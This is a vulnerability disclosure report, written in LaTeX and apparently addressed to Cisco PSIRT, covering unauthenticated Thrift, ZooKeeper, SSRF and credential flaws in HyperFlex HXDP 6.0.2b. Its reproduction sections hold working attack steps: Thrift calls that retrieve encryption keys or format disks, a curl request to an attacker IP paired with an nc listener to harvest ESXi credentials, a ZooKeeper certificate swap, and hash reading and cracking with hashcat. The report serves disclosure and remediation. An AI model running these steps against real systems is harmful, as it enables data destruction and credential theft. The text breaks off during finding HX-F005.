@@ -1,0 +1,1422 @@
+% =============================================================
+%  Cisco HyperFlex HXDP 6.0.2b --- Security Vulnerability Report
+%  For: Cisco PSIRT (psirt@cisco.com)
+%  Method: Static firmware analysis
+% =============================================================
+\documentclass[11pt,a4paper]{article}
+
+% ---- Encoding / fonts ----------------------------------------
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{lmodern}
+\usepackage[english]{babel}
+
+% ---- Layout --------------------------------------------------
+\usepackage[
+  a4paper,
+  top=25mm, bottom=25mm,
+  left=25mm, right=25mm,
+  headheight=14pt
+]{geometry}
+
+% ---- Typography ----------------------------------------------
+\usepackage{microtype}
+\usepackage{parskip}
+\emergencystretch=3em
+\widowpenalty=10000
+\clubpenalty=10000
+
+% ---- Math ----------------------------------------------------
+\usepackage{amsmath}
+
+% ---- Utility -------------------------------------------------
+\usepackage{etoolbox}
+\usepackage{needspace}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{enumitem}
+\usepackage[dvipsnames,table]{xcolor}
+
+% ---- Code ----------------------------------------------------
+\usepackage{listings}
+
+\lstset{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  numbers=none,
+  breaklines=true,
+  showstringspaces=false,
+  tabsize=4,
+  xleftmargin=6pt,
+  xrightmargin=6pt,
+}
+
+\lstdefinestyle{shell}{
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  breaklines=true,
+  showstringspaces=false,
+}
+
+\lstdefinestyle{python}{
+  language=Python,
+  basicstyle=\ttfamily\small,
+  backgroundcolor=\color{gray!8},
+  frame=single,
+  framesep=4pt,
+  rulecolor=\color{gray!40},
+  keywordstyle=\color{NavyBlue}\bfseries,
+  stringstyle=\color{ForestGreen},
+  commentstyle=\color{gray}\itshape,
+  breaklines=true,
+  showstringspaces=false,
+}
+
+% ---- Headers -------------------------------------------------
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{\small\textit{Cisco HyperFlex HXDP 6.0.2b --- Vulnerability Disclosure}}
+\fancyhead[R]{\small\textit{CONFIDENTIAL}}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+\renewcommand{\footrulewidth}{0pt}
+
+% ---- Hyperref (last) -----------------------------------------
+\usepackage[
+  colorlinks=true,
+  linkcolor=NavyBlue,
+  urlcolor=NavyBlue,
+  citecolor=NavyBlue,
+  pdftitle={Cisco HyperFlex HXDP 6.0.2b Vulnerability Disclosure},
+]{hyperref}
+
+% ---- Helpers -------------------------------------------------
+\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
+\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}
+
+% ---- Finding header macro ------------------------------------
+% \findingheader{ID}{CWE}{Attack}{C}{I}{A}{Known}{Exploited}{Discovered}
+\newcommand{\findingmeta}[9]{%
+\begin{tabular}{@{}L{3.8cm}L{10.5cm}@{}}
+\textbf{Vendor}             & Cisco Systems \\
+\textbf{Product}            & Cisco HyperFlex Data Platform (HXDP) \\
+\textbf{Affected Version}   & 6.0.2b-44423 (static analysis of storfs-packages-6.0.2b-44423.tgz) \\
+\textbf{CWE}                & #1 \\
+\textbf{Attack Type}        & #2 \\
+\textbf{Confidentiality}    & #3 \\
+\textbf{Integrity}          & #4 \\
+\textbf{Availability}       & #5 \\
+\textbf{Publicly Known}     & #6 \\
+\textbf{Actively Exploited} & #7 \\
+\textbf{Discovery}          & #8 \\
+\textbf{Confirmation}       & #9 \\
+\end{tabular}%
+}
+
+% =============================================================
+\begin{document}
+% =============================================================
+
+% ---- Title block --------------------------------------------
+\thispagestyle{plain}
+\begin{center}
+{\large\bfseries Cisco PSIRT Vulnerability Disclosure}\\[0.4em]
+{\normalsize
+\textbf{To:} psirt@cisco.com\\[0.2em]
+\textbf{Subject:} Multiple Critical Vulnerabilities in Cisco HyperFlex Data Platform 6.0.2b\\[0.2em]
+\textbf{Analysis method:} Static firmware analysis
+(\texttt{storfs-packages-6.0.2b-44423.tgz})\\[0.2em]
+\textbf{Encryption:} PGP response requested; findings contain sensitive technical detail\\[0.2em]
+\textbf{Timeline:} 90-day coordinated disclosure from first response
+}
+\end{center}
+
+\vspace{1em}
+\noindent\rule{\linewidth}{0.6pt}
+\vspace{0.5em}
+
+% =============================================================
+\section*{Summary of Findings}
+% =============================================================
+
+\begin{longtable}{L{1.4cm} L{7.5cm} L{1.2cm} L{1.8cm}}
+\toprule
+\textbf{ID} & \textbf{Title} & \textbf{CVSS} & \textbf{CWE} \\
+\midrule
+\endfirsthead
+\toprule
+\textbf{ID} & \textbf{Title} & \textbf{CVSS} & \textbf{CWE} \\
+\midrule
+\endhead
+\bottomrule
+\endfoot
+HX-F001 & Unauthenticated DARE Key Thrift RPC & 9.8 & CWE-306 \\
+HX-F002 & Unauthenticated StPlatform Thrift --- 180 Cluster Operations Exposed & 9.8 & CWE-306 \\
+HX-F003 & Unauthenticated SSRF + ESXi Credential Exfiltration via \texttt{/st-support/*} & 9.1 & CWE-918 \\
+HX-F004 & ZooKeeper Write Replaces nginx TLS Cert/Key with SFI Suppressed & 9.1 & CWE-284 \\
+HX-F005 & ZooKeeper Stores OS Password Hashes Readable Without Authentication & 9.1 & CWE-916 \\
+HX-F006 & Hardcoded Key \texttt{'springpath'} Decrypts ESXi, vCenter, and UCSM Credentials & 9.8 & CWE-321 \\
+HX-F007 & Static AES Key in Firmware Decrypts All Runtime Cluster Credentials & 9.1 & CWE-321 \\
+HX-F008 & Unauthenticated Drive Erasure and KEK Exposure on Port 8012 & 9.1 & CWE-306 \\
+HX-F009 & nginx Port 8997 Auto-Injects Admin Session --- No Credentials Required & 9.8 & CWE-284 \\
+HX-F010 & Unauthenticated Access to \texttt{/tmp/} via nginx \texttt{/sbdl/} Alias & 9.1 & CWE-284 \\
+HX-F011 & Root Session Token: 15-bit Entropy and World-Readable File & 9.1 & CWE-330 \\
+\bottomrule
+\end{longtable}
+
+% =============================================================
+\section*{What These Findings Mean}
+% =============================================================
+
+\textbf{HX-F001 --- Unauthenticated DARE Key Access}\\
+The storage daemon running on every HyperFlex node exposes a management
+interface that does not check who is calling before handing out the cluster's
+drive encryption keys. Any machine on the storage management network can call
+this interface, retrieve all encryption keys for the cluster, and use them to
+decrypt the contents of every protected drive. The same interface also accepts
+calls to replace those keys, which would make all encrypted data permanently
+inaccessible without anyone's authorization.
+
+\medskip
+\textbf{HX-F002 --- 180 Cluster Management Operations Without a Login}\\
+The same storage daemon exposes 180 management operations over the same
+unauthenticated interface. These include formatting all drives, shutting down
+the cluster, deleting datastores and their snapshots, removing nodes, and
+triggering cluster upgrades with attacker-chosen versions. No password is
+required for any of them. A single unauthenticated network request is enough
+to destroy all data in the cluster.
+
+\medskip
+\textbf{HX-F003 --- Unauthenticated Server-Side Request Forgery + Credential Harvest}\\
+The HyperFlex web management interface has a support-bundle endpoint that the
+authentication system was never configured to protect. Any unauthenticated
+caller can point this endpoint at an IP address they control. When that happens,
+the HyperFlex cluster uses its stored ESXi administrator credentials to connect
+to the attacker's machine, exposing those credentials in the process. The
+attacker learns the ESXi username and password for all hypervisors in the
+cluster without ever logging in.
+
+\medskip
+\textbf{HX-F004 --- Swap the Web Management TLS Certificate Without Authentication}\\
+HyperFlex watches a ZooKeeper path for certificate updates and automatically
+installs whatever certificate it finds there. ZooKeeper is accessible on the
+management network without authentication. An attacker can write their own
+certificate into that path, and within seconds HyperFlex will install it,
+restart its web server, and begin presenting the attacker's certificate to
+everyone who connects to the management interface. The certificate swap also
+bypasses the integrity monitoring system --- the software explicitly logs that it
+is skipping the check.
+
+\medskip
+\textbf{HX-F005 --- Live OS Password Hashes Available to Anyone on the Network}\\
+HyperFlex continuously writes the password hashes for the root, admin, and diag
+accounts into ZooKeeper so that all nodes in the cluster share the same
+credentials. ZooKeeper is accessible without a password. Anyone who can reach
+ZooKeeper on the management network can read these hashes and run them through a
+password cracker offline. The root hash gives SSH access to every storage
+controller in the cluster; the admin hash gives full web management access.
+
+\medskip
+\textbf{HX-F006 --- One Password Decrypts Every Cluster's ESXi, vCenter, and UCSM Credentials}\\
+HyperFlex encrypts and stores the passwords for ESXi, vCenter, and Cisco UCS
+Manager in ZooKeeper. The encryption password is the word ``springpath'' ---
+hardcoded in the software and confirmed in the 6.0.2b bytecode. The stored
+credentials are readable without authentication from ZooKeeper. An attacker
+who reads them can decrypt all three credential sets with a ten-line script,
+getting admin access to every hypervisor, the vCenter virtualization platform,
+and the physical hardware management layer.
+
+\medskip
+\textbf{HX-F007 --- Encryption Key for Cluster Credentials Shipped in the Firmware}\\
+HyperFlex encrypts the storage controller root password and SSL keystore
+password using a key derived from a file that ships inside the firmware package.
+That file --- \texttt{Secret.class} --- is publicly available in the firmware
+download. Its MD5 value is the encryption key, and it is the same on every
+single installation. Anyone with the firmware can derive the key and decrypt
+the credentials from any runtime configuration file they obtain.
+
+\medskip
+\textbf{HX-F008 --- Wipe All Drives Without a Password}\\
+A service running on every HyperFlex node manages the self-encrypting drives.
+It listens on a network port and accepts commands from anyone without checking
+for any credentials. One of those commands --- available to anyone on the
+management network --- triggers a cryptographic erase of every drive on the
+node. Data erased this way is unrecoverable. The same service also returns the
+node's key encryption key over the network without authentication, which can be
+used to decrypt drive contents.
+
+\medskip
+\textbf{HX-F009 --- Any Connection on Port 8997 Gets Admin Access}\\
+nginx on HyperFlex listens on port 8997 and automatically adds the administrator
+session credential to every request it receives, then forwards that request to
+the management API. Port 8997 accepts connections from any network address ---
+not just from localhost. Any machine that can reach port 8997 on a storage
+controller gets full administrator access to the entire HyperFlex management
+API without providing any credentials.
+
+\medskip
+\textbf{HX-F010 --- SSH Keys and ESXi Credentials Available at a Public URL}\\
+The nginx configuration maps the URL path \texttt{/sbdl/} directly to the
+\texttt{/tmp/} directory on disk, with authentication turned off. During normal
+cluster operations --- upgrades and node replacements --- HyperFlex writes SSH
+private keys and plaintext ESXi usernames and passwords into \texttt{/tmp/}.
+Any unauthenticated caller who knows or guesses the filename can download these
+files over HTTP.
+
+\medskip
+\textbf{HX-F011 --- Admin Session Token Guessable in Under a Second}\\
+HyperFlex generates an internal administrator session token by appending a
+random number between 0 and 32,767 to the VM's UUID. The UUID is readable from
+standard system tools. The token is then saved to a file readable by all users
+on the system. An attacker with the UUID can try all 32,768 possible tokens in
+under a second to find the valid one. Any local user can simply read the file
+directly.
+
+% =============================================================
+\section*{System Environment (Firmware Analysis)}
+% =============================================================
+
+\begin{tabular}{@{}L{4.5cm}L{9.5cm}@{}}
+\toprule
+\textbf{Component} & \textbf{Detail} \\
+\midrule
+Product                 & Cisco HyperFlex Data Platform (HXDP) \\
+Version                 & 6.0.2b-44423 \\
+Firmware corpus         & \texttt{storfs-packages-6.0.2b-44423.tgz} (848\,MB) \\
+Platform                & Storage Controller VM (stCtlVM), Debian/Linux, amd64 \\
+Analysis method         & Static: \texttt{nm}/\texttt{c++filt} (ELF symbols), \texttt{javap} (bytecode), config/script review \\
+Key packages            & \texttt{storfs-core}, \texttt{storfs-mgmt}, \texttt{storfs-misc}, \texttt{storfs-restapi}, \texttt{storfs-appliance} \\
+ZooKeeper version       & 3.8.1 (confirmed from \texttt{zookeeper\_3.8.1\_amd64.deb} in corpus) \\
+Java runtime            & \texttt{hxSecuritySvcMgr-1.0.jar}, \texttt{stMgr-1.0.jar}, \texttt{common-1.0.jar} \\
+Web layer               & Apache Tomcat, \texttt{ROOT-1.0.0.war} in \texttt{storfs-restapi} \\
+Proxy layer             & nginx (\texttt{storfs-misc/nginx.conf}, \texttt{rest\_internal.conf}) \\
+\bottomrule
+\end{tabular}
+
+\bigskip
+
+% =============================================================
+\section{HX-F001: Unauthenticated DARE Key Thrift RPC --- Encryption Key Exfiltration and Replacement}
+% =============================================================
+
+\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Binary symbol verification: \texttt{nm storfs | c++filt} confirmed handler addresses}
+
+\subsection*{Plain Language Summary}
+
+The storage management daemon on every HyperFlex node runs an encryption key
+service that does not require any authentication. Anyone on the storage
+management network can call this service and receive the Data Encryption Keys
+that protect all drives in the cluster. They can also replace those keys with
+their own, making the cluster's data permanently inaccessible. There is no
+credential, token, or IP check on either operation.
+
+\subsection*{Vulnerability Description}
+
+The \texttt{storfs} binary starts a dedicated Thrift server
+(\texttt{stNonBlockingEncServer}) for the \texttt{StPlatformEnc} service.
+The \texttt{process\_getDataEncryptionKeys} handler reads the Thrift frame and
+calls the underlying handler directly with no authentication step in between.
+The \texttt{dispatchCall} function routes to handlers by matching the method
+name as a string --- there is no token header check, no session lookup, and no
+IP restriction. The args struct for this call contains no credential fields.
+A successful call returns an \texttt{HxEncryptionData} object containing all
+Data Encryption Keys for the cluster. The \texttt{process\_setDataEncryptionKeys}
+handler accepts new keys with the same zero-auth pattern, giving an attacker full
+read and write access to all DARE keying material.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# nm storfs | c++filt -- confirmed symbols at 6.0.2b virtual addresses:
+
+0x9ade70  T  StPlatformEncProcessor::process_getDataEncryptionKeys(...)
+0x9ad880  T  StPlatformEncProcessor::process_setDataEncryptionKeys(...)
+0x9aef60  T  StPlatformEncProcessor::process_getEncryptionLibVersion(...)
+0x9ae450  T  StPlatformEncProcessor::process_loadEncryptionLib(...)
+0x9af4f0  T  StPlatformEncProcessor::dispatchCall(TProtocol*, TProtocol*,
+                  const string&, int, void*)  # string-match, no auth gate
+0xa2b9e0  T  StPlatformEncDispatcher::getDataEncryptionKeys(HxEncryptionData&)
+0x8c2910  T  StartNonBlockingEncServer(void*)
+BSS:0x1bd0970  stNonBlockingEncServer  # global server object
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+From any host with TCP access to the stCtlVM Thrift server port on the storage
+management network:
+
+\begin{lstlisting}[style=shell]
+# Connect to the StPlatformEnc Thrift service and call getDataEncryptionKeys
+# No credentials, session token, or client certificate required.
+# Thrift binary protocol, method name "getDataEncryptionKeys", seqid=1.
+python3 -c "
+from thrift.transport import TSocket, TTransport
+from thrift.protocol import TBinaryProtocol
+# StPlatformEnc service (port varies by deployment; typically 9090 or 9091)
+transport = TTransport.TBufferedTransport(TSocket.TSocket('<ctlvm_ip>', 9091))
+protocol  = TBinaryProtocol.TBinaryProtocol(transport)
+transport.open()
+protocol.writeMessageBegin('getDataEncryptionKeys', 1, 1)
+protocol.writeMessageEnd()
+transport.flush()
+# Response contains HxEncryptionData with all DEKs
+"
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Full read and write access to all Data Encryption Keys for the cluster.
+Exfiltration of DEKs defeats DARE. Replacement of DEKs renders all encrypted
+volumes permanently inaccessible.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Bind \texttt{stNonBlockingEncServer} to \texttt{127.0.0.1} only, or
+  replace the TCP Thrift interface with a Unix domain socket.
+\item Add caller-identity verification at the Thrift dispatch layer (mutual TLS
+  or pre-dispatch session token) before returning or accepting DEK material.
+\item Require an operator-signed request for any key-write operation.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-306: Missing Authentication for Critical Function ---
+  \url{https://cwe.mitre.org/data/definitions/306.html}
+\item Apache Thrift Security Considerations:
+  \url{https://thrift.apache.org/docs/concepts}
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F002: Unauthenticated StPlatform Thrift Interface --- 180 Cluster Management Operations Exposed}
+% =============================================================
+
+\findingmeta{CWE-306 (Missing Authentication for Critical Function)}{Network}{High}{High}{High}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Binary symbol count: \texttt{nm storfs | c++filt | grep process\_ | wc -l = 180}}
+
+\subsection*{Plain Language Summary}
+
+The same storage management daemon exposes 180 cluster operations over a
+network interface that does not check for any credentials. These operations
+include formatting every drive in the cluster, shutting the cluster down,
+deleting datastores and their snapshots, removing nodes from the cluster, and
+upgrading the cluster to an attacker-supplied version. A single unauthenticated
+network request can destroy all cluster data.
+
+\subsection*{Vulnerability Description}
+
+\texttt{StPlatformProcessor::dispatchCall} handles all 180 methods in the
+\texttt{StPlatform} Thrift service by matching the incoming method name as a
+string and calling the corresponding handler. There is no authentication gate
+before or after the dispatch. Disassembly of \texttt{process\_formatDisks} at
+\texttt{0x9947d0} confirms the sequence: RTTI type check, args parse,
+\texttt{readMessageEnd}, handler invocation --- no token check at any point.
+
+Destructive methods confirmed by name in the 6.0.2b symbol table:
+\texttt{formatDisks}, \texttt{shutdownCluster}, \texttt{deleteDatastore},
+\texttt{deleteDatastoreSnapshots}, \texttt{deleteFiles}, \texttt{removeNode},
+\texttt{removeDisk}, \texttt{clusterUpgrade}, \texttt{enableZKAuth},
+\texttt{resetZkConnectionString}, \texttt{setPlatformClusterAccessPolicy},
+\texttt{setPlatformMaintenanceMode}, \texttt{blacklistDisks},
+\texttt{retireDisks}, \texttt{unclaimDisks}, \texttt{revertDatastoreSnapshot},
+\texttt{teardownNRNFS}, \texttt{setDataWriteThru}.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# Total process_* handlers:
+nm storfs | c++filt | grep "StPlatformProcessor::process_" | wc -l
+# -> 180
+
+# Key addresses:
+0x9947d0  T  StPlatformProcessor::process_formatDisks(int, TProtocol*, TProtocol*, void*)
+0x98a5d0  T  StPlatformProcessor::dispatchCall(...)  # string-match, no auth
+0x8c27e0  T  StartNonBlockingServer(void*)
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+From any host with TCP access to the stCtlVM StPlatform Thrift port:
+
+\begin{lstlisting}[style=shell]
+# Call formatDisks with no credentials -- destroys all cluster data.
+# CONTROLLED ENVIRONMENT ONLY.
+python3 -c "
+from thrift.transport import TSocket, TTransport
+from thrift.protocol import TBinaryProtocol
+transport = TTransport.TBufferedTransport(TSocket.TSocket('<ctlvm_ip>', <port>))
+protocol  = TBinaryProtocol.TBinaryProtocol(transport)
+transport.open()
+protocol.writeMessageBegin('formatDisks', 1, 1)
+protocol.writeMessageEnd()
+transport.flush()
+"
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Unauthenticated caller can destroy all cluster data, halt the cluster, modify
+topology, or trigger a malicious upgrade. All 180 methods are accessible with
+the same zero-auth call pattern.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Bind the StPlatform Thrift server to \texttt{127.0.0.1} only.
+\item Add pre-dispatch authentication using a shared secret or mutual TLS.
+\item Require a signed operator token for all destructive methods
+  (\texttt{formatDisks}, \texttt{shutdownCluster}, \texttt{removeNode}).
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-306: Missing Authentication for Critical Function ---
+  \url{https://cwe.mitre.org/data/definitions/306.html}
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F003: Unauthenticated SSRF and ESXi Credential Exfiltration via \texttt{/st-support/*}}
+% =============================================================
+
+\findingmeta{CWE-918 (Server-Side Request Forgery)}{Network}{High}{None}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{WAR inspection: \texttt{unzip -p ROOT-1.0.0.war WEB-INF/web.xml} confirmed 0 filter-mappings for \texttt{/st-support/*}}
+
+\subsection*{Plain Language Summary}
+
+The HyperFlex web management interface includes a support bundle endpoint that
+was never wired into the authentication system. Any caller --- with no login ---
+can tell this endpoint to connect to an IP address of their choosing. When it
+does, it uses the cluster's stored ESXi administrator credentials to make that
+connection. The attacker's server sees those credentials arrive. The attacker
+now has the ESXi username and password for every hypervisor in the cluster.
+
+\subsection*{Vulnerability Description}
+
+\texttt{ROOT-1.0.0.war} (Tomcat, HX Connect port 443) maps the
+\texttt{StorvisorSupportBundle} servlet to \texttt{/st-support/*}.
+\texttt{WEB-INF/web.xml} defines six authentication filter classes.
+All 17 \texttt{filter-mapping} entries in the WAR cover \texttt{/rest/*},
+\texttt{/internalsupport/*}, \texttt{/upload/*}, and \texttt{/v1/*}.
+The \texttt{/st-support/*} path has zero filter-mapping entries --- none of the
+six authentication filters applies to it.
+
+The servlet accepts a \texttt{?host=} parameter, uses a
+\texttt{HostCredentialsAccess} object to read stored ESXi credentials from
+\texttt{EsxCredential} (username and password fields), and passes those
+credentials to \texttt{WebDownloader.getStream(url, username, password)} against
+the caller-supplied host. The response ZIP is returned to the caller.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# web.xml -- servlet mapping (no corresponding filter-mapping):
+<servlet-name>Springpath Support Bundle aggregation</servlet-name>
+<servlet-class>com.storvisor.sysmgmt.rest.StorvisorSupportBundle</servlet-class>
+<url-pattern>/st-support/*</url-pattern>
+
+# Filters defined: AuditFilter, SPPrivilegedAuth, SessionAuth,
+#                  KerberosAuth, SPBasicAuth, SPAuth
+# filter-mapping count: 17 total
+# filter-mapping entries covering /st-support/*: 0
+
+# Credential chain (class analysis):
+HostCredentialsAccess -> EsxCredential.username + EsxCredential.password
+    -> WebDownloader.getStream(url_with_host_param, username, password)
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# Start a netcat listener to observe inbound credentials:
+nc -lvp 80
+
+# Send unauthenticated request to /st-support/* pointing at the listener:
+curl -sk "https://<ctlvm>/st-support/?host=<attacker_ip>"
+
+# The listener receives an HTTP connection authenticated with the cluster's
+# stored ESXi username and password. No login to HX Connect required.
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Unauthenticated attacker obtains the ESXi administrator username and password
+for all hypervisors in the cluster. ESXi admin access grants hypervisor console
+on all nodes.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Add a \texttt{filter-mapping} entry for \texttt{/st-support/*} to the
+  authentication filter chain in \texttt{web.xml}.
+\item Validate the \texttt{host} parameter against a whitelist of known cluster
+  node IPs before constructing the credential object.
+\item Audit all other servlet mappings for similar filter coverage gaps.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-918: Server-Side Request Forgery ---
+  \url{https://cwe.mitre.org/data/definitions/918.html}
+\item OWASP Server-Side Request Forgery:
+  \url{https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/}
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F004: ZooKeeper Write Replaces nginx TLS Certificate and Key with System File Integrity Suppressed}
+% =============================================================
+
+\findingmeta{CWE-284 (Improper Access Control)}{Network}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Bytecode: \texttt{javap -verbose HXCertificateZKMonitor.class} confirmed watcher and write chain}
+
+\subsection*{Plain Language Summary}
+
+HyperFlex watches a location in ZooKeeper for certificate updates and
+automatically installs whatever it finds there as the web server's TLS
+certificate. ZooKeeper does not require a password in the default configuration.
+An attacker who can reach the ZooKeeper port can write their own certificate
+into that location. HyperFlex will detect the change, install the attacker's
+certificate, and restart the web server within seconds. The software explicitly
+logs that it is skipping the integrity check that would otherwise flag this.
+Every administrator who then logs into HX Connect is connecting through the
+attacker's certificate.
+
+\subsection*{Vulnerability Description}
+
+\texttt{HXCertificateZKMonitor} registers a NodeCache watcher on ZooKeeper path
+\texttt{/certificates/hxcertificate}. When the node changes, \texttt{nodeChanged()}
+reads the new data and calls \texttt{writeSslCert()} and \texttt{writeSslKey()},
+which overwrite \texttt{/etc/nginx/server.crt} and \texttt{/etc/nginx/server.key}
+via direct \texttt{PrintWriter} writes, then call \texttt{restartNginx()}.
+
+After the write, the code emits the log line: \textit{``Suppressed SFI ---
+Baseline Update for System File Integrity is Skipped!''} --- explicitly bypassing
+the system integrity monitoring that would otherwise detect the change.
+
+ZooKeeper listens on port 2181 with the default \texttt{OPEN\_ACL\_UNSAFE} ACL
+(\texttt{world:anyone:cdrwa}). No authentication is required to write to
+\texttt{/certificates/hxcertificate}.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# javap -verbose HXCertificateZKMonitor.class (hxSecuritySvcMgr-1.0.jar):
+
+# Watcher setup:
+registerNodeCacheListener():
+  zkClient.registerNodeCacheListenerForPath("/certificates/hxcertificate", this)
+
+# nodeChanged() chain -- bytecode offsets:
+28: zkClient.getDataInPath("/certificates/hxcertificate", Type<HxCertificate>)
+66: writeSslCert(hxCert.getCertificateString())
+77: writeSslKey(hxCert.getPrivateKeyString())
+84: restartNginx()
+90: logger.warn("Suppressed SFI - Baseline Update ... is Skipped!")
+
+# writeSslCert -- direct unvalidated write:
+new PrintWriter(NGINX_CERT_PATH, "UTF-8").print(zkData)
+# NGINX_CERT_PATH = "/etc/nginx/server.crt"
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=python]
+from kazoo.client import KazooClient
+import json
+
+# Connect to ZooKeeper without credentials (default OPEN_ACL_UNSAFE):
+zk = KazooClient(hosts='<ctlvm_ip>:2181')
+zk.start()
+
+# Write attacker certificate to /certificates/hxcertificate:
+payload = json.dumps({
+    "cert": "<PEM_CERT_STRING>",
+    "key":  "<PEM_KEY_STRING>"
+}).encode()
+zk.set("/certificates/hxcertificate", payload)
+zk.stop()
+# -> HXCertificateZKMonitor fires within seconds
+# -> /etc/nginx/server.crt replaced with attacker cert
+# -> nginx restarted; SFI check suppressed
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Attacker controls the TLS certificate presented by HX Connect (port 443).
+All subsequent management connections are susceptible to inspection or
+credential harvesting if the attacker controls the network path.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Apply a restrictive ACL on the \texttt{/certificates/} subtree in
+  ZooKeeper (\texttt{digest:hxservice:rwcda}), replacing
+  \texttt{OPEN\_ACL\_UNSAFE}.
+\item Do not accept raw certificate material from ZooKeeper without CA
+  signature verification.
+\item Remove the SFI suppression --- certificate changes must trigger an
+  integrity baseline update, not skip it.
+\end{enumerate}
+
+\subsection*{References}
+
+\begin{itemize}[noitemsep]
+\item CWE-284: Improper Access Control ---
+  \url{https://cwe.mitre.org/data/definitions/284.html}
+\item Apache ZooKeeper Access Control:
+  \url{https://zookeeper.apache.org/doc/current/zookeeperProgrammers.html#sc_ZooKeeperAccessControl}
+\end{itemize}
+
+\bigskip
+
+% =============================================================
+\section{HX-F005: ZooKeeper Stores OS Password Hashes for root, admin, and diag --- Readable Without Authentication}
+% =============================================================
+
+\findingmeta{CWE-916 (Use of Password Hash with Insufficient Computational Effort)}{Network}{High}{High}{None}{No}{No (static firmware analysis)}{Firmware analysis of storfs-packages-6.0.2b-44423.tgz}{Configuration: \texttt{application.conf} from \texttt{hxSecuritySvcMgr-1.0.jar} confirmed \texttt{syncEnabled=true}}
+
+\subsection*{Plain Language Summary}
+
+HyperFlex continuously synchronizes the password hashes for the root, admin,
+and diag accounts to ZooKeeper so that all nodes in the cluster use the same
+credentials. ZooKeeper is accessible without a password. Anyone on the
+management network can read these hashes and run them through a password cracker.
+The root hash gives SSH access to every storage controller in the cluster. The
+admin hash gives full web management access. These are the live, currently-active
+passwords --- not old defaults or build-time values.
+
+\subsection*{Vulnerability Description}
+
+\texttt{hxSecuritySvcMgr} is configured in \texttt{application.conf} to
+synchronize OS credentials to ZooKeeper path \texttt{/user\_credentials} with
+\texttt{syncEnabled = true}, covering the \texttt{root}, \texttt{admin}, and
+\texttt{diag} accounts. The value stored is a semicolon-delimited string of
+SHA-256 crypt(3) hashes generated by \texttt{mkpasswd -m sha-256} (hashcat mode
+7400). The ZK path inherits the default \texttt{OPEN\_ACL\_UNSAFE} ACL
+(\texttt{world:anyone:cdrwa}). Any host with TCP access to port 2181 can read
+the current live hashes without authentication. \texttt{PermitRootLogin yes}
+is the default on stCtlVM nodes.
+
+\subsection*{Technical Evidence (6.0.2b)}
+
+\begin{lstlisting}
+# application.conf (hxSecuritySvcMgr-1.0.jar, 6.0.2b):
+password {
+  zkPath       = "/user_credentials"
+  syncEnabled  = true
+  syncAccounts = ["root", "admin", "diag"]
+}
+
+# setpasswd.sh -- how hashes are applied:
+echo -e ${user}:${pass} | chpasswd -e
+
+# Read from ZooKeeper without credentials:
+zkCli.sh -server <ctlvm_ip>:2181 get /user_credentials
+# Returns: root:$5$<salt>$<hash>;admin:$5$<salt>$<hash>;diag:$5$<salt>$<hash>;
+
+# Crack the root hash:
+hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
+# Cracked root hash -> ssh root@<ctlvm>  (PermitRootLogin yes)
+\end{lstlisting}
+
+\subsection*{Reproduction}
+
+\begin{lstlisting}[style=shell]
+# Read hashes from ZooKeeper -- no credentials required:
+zkCli.sh -server <ctlvm_ip>:2181 get /user_credentials
+
+# Extract individual hashes and crack offline:
+echo '<root_sha256crypt_hash>' > hashes.txt
+hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
+\end{lstlisting}
+
+\subsection*{Impact}
+
+Live OS password hashes for three privileged accounts are readable without
+authentication. Cracked root hash yields SSH root access to all cluster nodes.
+Cracked admin hash yields full HX Connect cluster management access.
+
+\subsection*{Remediation}
+
+\begin{enumerate}[noitemsep]
+\item Apply a restrictive ACL on \texttt{/user\_credentials} in ZooKeeper
+  (\texttt{digest:hxservice:rwcda}).
+\item Replace SHA-256 crypt with bcrypt or scrypt to increase cracking cost.
